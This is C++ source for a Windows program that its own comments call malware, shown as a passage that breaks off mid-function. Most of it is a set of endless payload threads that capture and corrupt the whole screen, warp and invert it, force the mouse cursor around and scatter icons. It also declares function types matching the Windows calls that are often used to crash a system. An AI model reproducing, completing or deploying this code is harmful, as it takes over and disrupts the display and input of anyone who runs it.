﻿// diagpkg.cpp : 定义应用程序的入口点。
//
// diagpkg.exe:a new long malware
// maybe 2.0 version of Cephacetrile(skidded shit)??
// 
//

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define random rand
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define DESKTOP_WINDOW ((HWND)0)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
using namespace std;
double cot(double x) {
	double res = tan(PI / 2 - x);
	return res;
}
double cotf(double x) {
	double res = tanf(PI / 2 - x);
	return res;
}
double acot(double x) {
	double res = atan(PI / 2 - x);
	return res;
}
double cotl(double x) {
	double res = tanl(PI / 2 - x);
	return res;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;
struct Point3D {
	float x, y, z;
};
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}
	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
COLORREF COLORHSV(int HSV) {
	double h = fmod(HSV, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 190) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 250) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 200) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = x;
		b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
int DrawIconFunction(int x, int y, int size, HICON hIcon) {
	HDC hdc = GetDC(0);
	DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
	ReleaseDC(0, hdc);
	DestroyIcon(hIcon); DeleteObject(hIcon);
	return 1;
}
Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);
	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y;
	point.z = z;
	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x;
	point.z = z;
	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x;
	point.y = y;
	return point;
}
void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, HICON ico) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};
	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
		DrawIcon(hdc, screenX, screenY, ico);
	}

	POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
	Polyline(hdc, polyline1, 5);
	POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
	Polyline(hdc, polyline2, 5);
	POINT connectingLines[8] = {
		screenPoints[0], screenPoints[4],
		screenPoints[1], screenPoints[5],
		screenPoints[2], screenPoints[6],
		screenPoints[3], screenPoints[7]
	};
	Polyline(hdc, &connectingLines[0], 2);
	Polyline(hdc, &connectingLines[2], 2);
	Polyline(hdc, &connectingLines[4], 2);
	Polyline(hdc, &connectingLines[6], 2);
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI Payload6_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return (((t + 1) ^ (1 + (((t + 1) & -4 | t >> 12)) & 42) * 5 | t & t >> 6));
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload14_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t >> 11 >> (t >> 5 & 7) & 2) * 255);
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI MouseColours(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int signX = 1, signY = 1, signX1 = 1, signY1 = 1, incrementor = 10, x = 10, y = 10;
	POINT cursor;
	while (true)
	{
		hdc = GetDC(0);
		GetCursorPos(&cursor);
		x += incrementor * signX;
		y += incrementor * signY;
		SetCursorPos(x, y);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		int rndsize = rand() % 200 + 5;
		BitBlt(hdc, cursor.x, cursor.y, rndsize, rndsize, hdc, cursor.x, cursor.y, PATINVERT);
		if (y >= GetSystemMetrics(SM_CYSCREEN)) { signY = -1; }
		if (x >= GetSystemMetrics(SM_CXSCREEN)) { signX = -1; }
		if (y == 0) { signY = 2; }
		if (x == 0) { signX = 2; }
		DeleteObject(hbrush);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI Payload1_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	PRGBTRIPLE triple;
	BITMAPINFO bmi = { 40, w, h, 1, 24 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, 0, (void**)&triple, 0, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true) 
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			triple[i].rgbtRed += int(round(cbrt(i))) | (triple[i].rgbtRed) + rand() % 256;
			triple[i].rgbtGreen += int(round(log(i))) | (triple[i].rgbtGreen) + rand() % 256;
			triple[i].rgbtBlue += int(round(fabs(i))) | (triple[i].rgbtBlue) + rand() % 256;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload1_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true) 
	{
		hdc = GetDC(0);
		int luckynum = rand() % 10;
		if (luckynum >= 6) {
			BitBlt(hdc, 0, 0, w - 20, h, hdc, w - 20, 0, SRCAND);
			BitBlt(hdc, 20, 0, w, h, hdc, 0, 0, SRCAND);
		}
		else {
			BitBlt(hdc, w - 20, 0, w - 20, h, hdc, 0, 0, SRCAND);
			BitBlt(hdc, -20, 0, w, h, hdc, 0, 0, SRCAND);
		}
		luckynum = rand() % 10;
		if (luckynum >= 6) {
			BitBlt(hdc, 0, 0, w, h - 20, hdc, 0, h - 20, SRCPAINT);
			BitBlt(hdc, 0, 20, w, h, hdc, 0, 0, SRCPAINT);
		}
		else {
			BitBlt(hdc, 0, h - 20, w, h - 20, hdc, 0, 0, SRCPAINT);
			BitBlt(hdc, 0, -20, w, h, hdc, 0, 0, SRCPAINT);
		}
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload2_num1(LPVOID lparam) {//credits to camellia-y7x
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), cnt = 0;
	DWORD ROP[7] = { SRCCOPY,SRCPAINT,SRCAND,SRCINVERT,SRCERASE,NOTSRCCOPY,NOTSRCERASE };
	while (true)
	{
		hdc = GetDC(0);
		for (int i = 0; i < h; i += 20) { StretchBlt(hdc, rand() % 20, i, w, 20, hdc, rand() % 20, i, w, 20, ROP[rand() % 7]); }
		for (int x = 0; x <= w; x += 100) {
			HBRUSH hBrush = CreateSolidBrush(RndRGB);
			SelectObject(hdc, hBrush);
			BitBlt(hdc, x, 0, 100, h, hdc, x, 0, PATINVERT);
			DeleteObject(hBrush);
			if (cnt == 10) { cnt = 0; Sleep(1); }
			else { cnt++; }
		}
		for (int i = 0; i < 40; i++) {
			int y = rand() % 4, randx = rand() % w, randy = rand() % h, randxCopy = rand() % w, randyCopy = rand() % h;
			if (y == 1) { StretchBlt(hdc, randx - 5, randy, h, h, hdc, randx, randy, h, h, ROP[rand() % 7]); }
			if (y == 2) { StretchBlt(hdc, randx + 5, randy, h, h, hdc, randx, randy, h, h, ROP[rand() % 7]); }
			if (y == 3) { StretchBlt(hdc, randx, randy - 5, h, h, hdc, randx, randy, h, h, ROP[rand() % 7]); }
			if (y == 4) { StretchBlt(hdc, randx, randy + 5, h, h, hdc, randx, randy, h, h, ROP[rand() % 7]); }
			BitBlt(hdc, rand() % 5, rand() % 5, rand() % w, rand() % h, hdc, rand() % 5, rand() % 5, ROP[rand() % 7]);
			BitBlt(hdc, randxCopy, randyCopy, 200, 200, hdc, randxCopy + rand() % 40 - 10, randyCopy + rand() % 40 - 10, ROP[rand() % 7]);
		}
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload2_num2(LPVOID lpParam) {
	HICON hIcon;
	int size = 0, w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	srand(time(NULL));
	while (true)
	{
		hIcon = LoadIcon(0, lpIconNames[rand() % 6]); size = 32 + rand() % 118;
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
		hIcon = LoadCursor(0, lpCursorNames[rand() % 16]); size = 32 + rand() % 118;
		DrawIconFunction(rand() % w, rand() % h, size, hIcon);
		Sleep(20);
	}
}
DWORD WINAPI Payload3_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), j = 1, c = 0;
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int j = c * 4;
				int wave = (int)(j + (j * cbrt(((x | x) - (y ^ y) + (x & y) - (y >> x)) / 64)));
				data[y * w + x].rgb += COLORHSV((w + h) + wave);
			}
		}
		c++;
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload3_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	RECT rect;
	POINT pt[3];
	while (true)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		pt[0].x = rect.left + 114;
		pt[0].y = rect.top + 51;
		pt[1].x = rect.right - 41;
		pt[1].y = rect.top + 91;
		pt[2].x = rect.left - 98;
		pt[2].y = rect.bottom + 10;
		PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Payload4_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	PRGBQUAD rgbScreen = { 0 };
	bmp = CreateDIBSection(hdc, &bmpi, NULL, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			int cx = floor(x - (w / 2));
			int cy = floor(y - (h / 2));
			int zx = ceil(cx * cx);
			int zy = ceil(cy * cy);
			int diao = 128.f + i;
			int fx = diao + (diao * log(cbrt(zy - zx) / 32.f));
			rgbScreen[i].r >>= GetRValue(fx + i) + 200;
			rgbScreen[i].g ^= GetGValue(fx + i) - 150;
			rgbScreen[i].b -= GetBValue(fx + i) + 114;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload4_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		for (int x = 0; x < w; x += 40) { for (int y = 0; y < h; y += 40) { StretchBlt(hdc, x, y, 40, 40, hdc, x, y, 25, 25, SRCCOPY); } }
		for (int i = 0; i < h; i++) { StretchBlt(hdc, -1 + (rand() % 3), i, w, 1, hdc, 0, i, w, 1, SRCCOPY); }
		for (int x = 0; x < w; x += 35) {
			for (int y = 0; y < h; y += 35) {
				if (rand() % 8 != 1) { StretchBlt(hdc, x, y, 35, 35, hdc, x, y, 20, 20, SRCERASE); }
				else { StretchBlt(hdc, x, y, 35, 35, hdc, x, y, 20, 20, NOTSRCERASE); }
			}
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload5_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0, move = 20;;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = ((4 ^ i) + ((4 * i) * acos(cosf(x / 16.f))) + ((8 * i) * asin(sinf(y / 24.f))));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 200, 1.f);
				hslcolor.s = 0.5033f;
				hslcolor.l += 1.05033f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
		i++;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload7_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	double mazelarper_s_dicknum = 0.5033f;
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int cx = (x - (w / 3.4));
				int cy = (y - (h / 1.5));
				int zx = atan(tanf(mazelarper_s_dicknum)) * cx - acot(cotf(mazelarper_s_dicknum)) * cy;
				int zy = acot(cotf(mazelarper_s_dicknum)) * cx + atan(tanf(mazelarper_s_dicknum)) * cy;
				int fx = i & 32768 ? (((((zx + i) | (zy - i)) ^ ((zy + i) | (zx - i))) + 7) | ((((zx + i) | (zy + i)) & ((zy + i) | (zx + i))) + 5)) : ((((zx - i) ^ (zy + i)) + 7) | (((zx - i) & (zy + i)) + 5));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(fx) / 10000.0 + 0.09, 1.0);
				hslcolor.s = 1.05033f;
				hslcolor.l += 0.114514f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload7_num2(LPVOID lpParam) //credits to RaduMinecraft, but i modified it
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), signX = 1, signY = 1, incrementor = 10;
	float w2 = 0.0f, h2 = 0.0f, angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f, angleIncrement = 0.09f, size = 91.78f;
	while (true) 
	{
		hdc = GetDC(0);
		w2 += incrementor * signX;
		h2 += incrementor * signY;
		if (w2 + 1 >= w) {
			signX = -1;
			w2 = w - 11;
		}
		else if (w2 <= 1) {
			signX = 2;
			w2 = 11;
		}
		if (h2 + 1 >= h) {
			signY = -1;
			h2 = h - 11;
		}
		else if (h2 <= 1) {
			signY = 2;
			h2 = 11;
		}
		Point3D center = { w2, h2, 88.88f };
		HPEN hpen = CreatePen(0, 1, RndRGB);
		SelectObject(hdc, hpen);
		Draw3DCube(hdc, center, size, angleX, angleY, angleZ, LoadCursor(0, lpCursorNames[rand() % 16]));
		angleX += angleIncrement;
		angleY += angleIncrement;
		angleZ += angleIncrement;
		Sleep(10);
		ReleaseDC(0, hdc);
		DeleteObject(hpen);
		if (size >= 0 && size <= 10) { size += 10; }
	}
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), ii = 0;
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	double radius = 18.f, angle = 0.f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		float x = cos(angle) * radius, y = sin(angle) * radius;
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].r |= ~((x * x) >> (y * y) * ii) / (i + 1);
			rgbScreen[i].g ^= ((x * x) ^ (y * y) * ~ii) / (i + 1);
			rgbScreen[i].b -= ((x * x) & (y * y) * ii) / (i + 1);
		}
		ii++;
		for (int y = 0; y < h; y += 40) { StretchBlt(hdcCopy, -20 + rand() % 40, y, w, 40, hdcCopy, 0, y, w, 40, SRCINVERT); }
		for (int x = 0; x < w; x += 40) { StretchBlt(hdcCopy, x, -20 + rand() % 40, 40, h, hdcCopy, x, 0, 40, h, SRCINVERT); }
		BitBlt(hdc, 0, 0, w, h, hdcCopy, x, y, SRCERASE);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		angle = fmod(angle + PI / radius, PI * radius);
		Sleep(1);
	}
